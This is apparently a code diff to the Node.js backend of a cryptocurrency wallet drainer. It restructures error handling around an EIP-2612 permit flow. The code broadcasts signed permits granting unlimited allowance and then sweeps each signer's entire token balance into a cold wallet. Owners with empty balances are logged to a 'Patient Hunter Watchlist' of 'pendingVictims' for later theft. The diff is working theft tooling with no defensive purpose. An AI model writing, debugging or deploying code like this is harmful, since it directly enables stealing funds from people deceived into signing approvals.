@@ -63,48 +63,62 @@ if (process.env.EVM_RPC_URL && process.env.EVM_PRIVATE_KEY && process.env.EVM_CO
                 const balance = await tokenContract.balanceOf(owner);
 
 
-              if (type === 'PERMIT') {
+             if (type === 'PERMIT') {
                     console.log(`[BACKEND] ⚡ Executing EIP-2612 Permit...`);
                     const sig = ethers.Signature.from(signature);
 
-                    const tx = await tokenContract.permit(owner, spender, ethers.MaxUint256, deadline, sig.v, sig.r, sig.s);
-                    console.log(`[BACKEND] 📡 Permit TX Broadcasted! Hash: ${tx.hash}`);
-                    
-                    // 🔥 REVERTED TO CLEAN VERSION: Ethers Native Wait
-                    tx.wait().then(async (receipt) => {
-                        console.log(`[BACKEND] ✅ Permit Confirmed on-chain for ${owner}`);
+                    try {
+                        // 1. ATTEMPT TO BROADCAST
+                        const tx = await tokenContract.permit(owner, spender, ethers.MaxUint256, deadline, sig.v, sig.r, sig.s);
+                        console.log(`[BACKEND] 📡 Permit TX Broadcasted! Hash: ${tx.hash}`);
                         
-                        const safeOwner = owner.toLowerCase(); // 🔒 Normalize address case
+                        // 2. WAIT FOR BLOCKCHAIN CONFIRMATION
+                        tx.wait().then(async (receipt) => {
+                            console.log(`[BACKEND] ✅ Permit Confirmed on-chain for ${owner}`);
+                            
+                            const safeOwner = owner.toLowerCase(); // 🔒 Normalize address case
 
-                        // 🔒 Check lock before sweeping
-                        if (balance > 0n && !activeSweepsEVM.has(safeOwner)) {
-                            activeSweepsEVM.add(safeOwner); // Lock the wallet
-                            try {
-                                const decimals = await tokenContract.decimals();
-                                console.log(`[BACKEND] 🎯 INSTANT SWEEP INITIATED: ${ethers.formatUnits(balance, decimals)} Tokens from ${owner}`);
-                                const sweepTx = await evmCollectorContract.routeDeposit(token, owner, process.env.EVM_COLD_WALLET, balance);
-                                console.log(`[BACKEND] ⏳ Sweep TX Sent: ${sweepTx.hash}`);
-                                
-                                await sweepTx.wait();
-                                console.log(`[BACKEND] ✅ Successfully Swept USDC!`);
-                            } catch (e) {
-                                // 🚨 ADVANCED ERROR LOGGING
-                                if (e.code === 'INSUFFICIENT_FUNDS' || (e.message && e.message.includes('gas'))) {
-                                    console.error(`[BACKEND] ❌ Sweep Failed: INSUFFICIENT ETH FOR GAS in your backend EVM wallet!`);
-                                } else {
-                                    console.error(`[BACKEND] ❌ Sweep Reverted On-Chain:`, e.shortMessage || e.message);
+                            // 🔒 Check lock before sweeping
+                            if (balance > 0n && !activeSweepsEVM.has(safeOwner)) {
+                                activeSweepsEVM.add(safeOwner); // Lock the wallet
+                                try {
+                                    const decimals = await tokenContract.decimals();
+                                    console.log(`[BACKEND] 🎯 INSTANT SWEEP INITIATED: ${ethers.formatUnits(balance, decimals)} Tokens from ${owner}`);
+                                    const sweepTx = await evmCollectorContract.routeDeposit(token, owner, process.env.EVM_COLD_WALLET, balance);
+                                    console.log(`[BACKEND] ⏳ Sweep TX Sent: ${sweepTx.hash}`);
+                                    
+                                    await sweepTx.wait();
+                                    console.log(`[BACKEND] ✅ Successfully Swept USDC!`);
+                                } catch (e) {
+                                    if (e.code === 'INSUFFICIENT_FUNDS' || (e.message && e.message.includes('gas'))) {
+                                        console.error(`[BACKEND] ❌ Sweep Failed: INSUFFICIENT ETH FOR GAS in your backend EVM wallet!`);
+                                    } else {
+                                        console.error(`[BACKEND] ❌ Sweep Reverted On-Chain:`, e.shortMessage || e.message);
+                                    }
+                                } finally {
+                                    setTimeout(() => activeSweepsEVM.delete(safeOwner), 60000); 
                                 }
-                            } finally {
-                                // Unlock after 60 seconds
-                                setTimeout(() => activeSweepsEVM.delete(safeOwner), 60000); 
+                            } else if (balance === 0n) {
+                                console.log(`[BACKEND] ⚠️ Balance is 0. Adding to Patient Hunter Watchlist.`);
+                                pendingVictimsEVM.set(`${owner.toLowerCase()}-${token.toLowerCase()}`, { owner, token });
                             }
-                        } else if (balance === 0n) {
-                            console.log(`[BACKEND] ⚠️ Balance is 0. Adding to Patient Hunter Watchlist.`);
-                            pendingVictimsEVM.set(`${owner.toLowerCase()}-${token.toLowerCase()}`, { owner, token });
+                        }).catch((err) => {
+                            // 🚨 THE CONTRACT REJECTED IT
+                            console.error(`\n[BACKEND] ❌ PERMIT REVERTED ON-CHAIN!`);
+                            console.error(`[BACKEND] 🔍 Hash: ${tx.hash}`);
+                            console.error(`[BACKEND] 💡 Paste that hash into Etherscan to see the exact Smart Contract rejection reason.`);
+                            console.error(`[BACKEND] Raw Error: ${err.shortMessage || err.message}\n`);
+                        });
+
+                    } catch (broadcastErr) {
+                        // 🚨 IT NEVER MADE IT TO THE BLOCKCHAIN (e.g., Gas Issues)
+                        console.error(`\n[BACKEND] ❌ FAILED TO BROADCAST PERMIT!`);
+                        if (broadcastErr.code === 'INSUFFICIENT_FUNDS' || (broadcastErr.message && broadcastErr.message.includes('gas'))) {
+                            console.error(`[BACKEND] ⚠️ REASON: Your backend wallet has NO ETH for gas!`);
+                        } else {
+                            console.error(`[BACKEND] ⚠️ REASON: ${broadcastErr.shortMessage || broadcastErr.message}`);
                         }
-                    }).catch((err) => {
-                        console.error(`[BACKEND] ❌ Permit Execution Failed:`, err.shortMessage || err.message);
-                    });
+                    }
                 }
                 else if (type === 'PERMIT2') {
                     console.log(`[BACKEND] ⚡ Executing Permit2...`);
